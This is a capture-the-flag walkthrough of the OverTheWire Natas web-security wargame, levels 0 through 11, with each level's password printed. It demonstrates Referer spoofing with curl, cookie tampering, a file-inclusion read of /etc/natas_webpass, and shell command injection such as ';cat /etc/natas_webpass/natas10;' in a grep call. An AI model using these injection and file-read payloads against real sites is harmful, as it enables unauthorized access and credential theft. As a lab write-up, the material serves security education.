## Form-factor

<http://natasX.natas.labs.overthewire.org/>

### [natas0](http://natas0.natas.labs.overthewire.org/)

natas0:natas0

The password for natas1 is located in a comment on the webpage:

```html
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto-->
```

===

### [natas1](http://natas1.natas.labs.overthewire.org/)

natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto

So this page apparently disables right-clicking, but I already had Firefox's element inspector open, so I didn't need to right-click anyway.

```html
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi-->
```

If I hadn't been lucky enough to come into the page with the inspector open, I could also hit `F12` to open it, open the page's source with C-u, or disable JavaScript and then right-click away!

===

### [natas2](http://natas2.natas.labs.overthewire.org/)

natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

Examining the source of the page we see a 1x1 image located at `files/pixel.png`. I looked into the file to see if the password was hidden inside it. The file didn't have anything inside, but it did alert us to the existence of the `files/` directory, we navigate to that directory to find `files/users.txt`

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

So there's our password.

===

### [natas3](http://natas3.natas.labs.overthewire.org/)

natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

Bit of a cheeky comment in the page's source this time:

```html
<!-- No more information leaks!! Not even Google will find it this time... -->
```

While I'm sure I could google `"natas3 solution"` to find that ellusive password, I realized after a bit of thinking that this comment was hinting toward's the site's `robots.txt`, a file that contains rules for web-crawlers

```
User-agent: *
Disallow: /s3cr3t/
```

in `s3cr3t/` we find `users.txt`, which contains our login information

```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

===

### [natas4](http://natas4.natas.labs.overthewire.org/)

natas4:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

Okay, so here we'll need to spoof the referer header to get the info we need, let's just use `curl`.

```console
curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ natas4.natas.labs.overthewire.org --referer "http://natas5.natas.labs.overthewire.org/"
...
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

===

### [natas5](http://natas5.natas.labs.overthewire.org/)

natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

So when trying to connect we are told that we are not logged in, as logging in is usually handled by cookies, let's take a look at the cookies to see what we can find.

In Firefox you can use `shift + F9` to open the storage pane, if you click on the natas5 entry underneath "Cookies", we can see that there is a cookie called `loggedin` set to 0. We set the value of that cookie to 1, refresh, and are given the password.

```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

===

### [natas6](http://natas6.natas.labs.overthewire.org/)

natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

This one is pretty straightforward, we see in the source code in the link provided that our input is checked against the variable `$secret` included from `includes/secret.inc`. Here's the content of `http://natas6.natas.labs.overthewire.org/includes/secret.inc`

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

We input the sting `FOEIUWGHFEEUHOFUOIU` into the field, submit, and get our password

```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

===

### [natas7](http://natas7.natas.labs.overthewire.org/)

natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

A useful hint appears in the source of this one

```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

So clearly we're going to be poking our way into the server a bit, let's abuse the `index.php?page=X` layout this page is using. Let's jsut try `natas7.natas.labs.overthewire.org/index.php?page=` to start

```
Warning: include(): Filename cannot be empty in /var/www/natas/natas7/index.php on line 21

Warning: include(): Failed opening '' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/natas/natas7/index.php on line 21
```

Okay so it looks like this page just tries to grab whatever file is after the `=` in the url, I bet they aren't going to account for us poking into the root directory `natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

===

### [natas8](http://natas8.natas.labs.overthewire.org/)

natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

Looking at the provided sourcecode, we just have to reverse this whole operation

```JavaScript
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

This should do it:

```PHP
base64_decode(strrev(hex2bin($encodedSecret)))
```

Of course, we can't actually access those functions, if they exists, so I'll just do it in a shell

```console
maket@anderson ~/p/o/natas> echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d
oubWYf2kBq
```

We put this string into the field and get back our password

```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

===

### [natas9](http://natas9.natas.labs.overthewire.org/)

natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

Looking at the source code, here's the exploitable part (note `$key` is the value of the input field)

```PHP
passthru("grep -i $key dictionary.txt");
```

Here's what we'll input to inject our command into the server and get the password

```
;cat /etc/natas_webpass/natas10;
# this makes the grep command
grep -i ;cat/etc/natas_webpass/natas10; dictionary.txt
```

```
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

===

### [natas10](http://natas10.natas.labs.overthewire.org/)

natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

The program now filters out `;`, `|`, and `&`, so we as easily run our own commands. Let's just mess with the `grep` command itself, we'll input

```
-r . /etc/natas_webpass
# which makes the grep command
grep -i -r . /etc/natas_webpass dictionary.txt
```
the output is large, but the password we need is there

```
/etc/natas_webpass/natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
...
```

===

### [natas11](http://natas11.natas.labs.overthewire.org/)

natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

We'll be reverse engineering the key used to XOR encrypt the cookie that stores the `showpassword` and `bgcolor` variables, then we'll use that key to encrypt data with `showpassword="yes"`, which will make the page give us the password.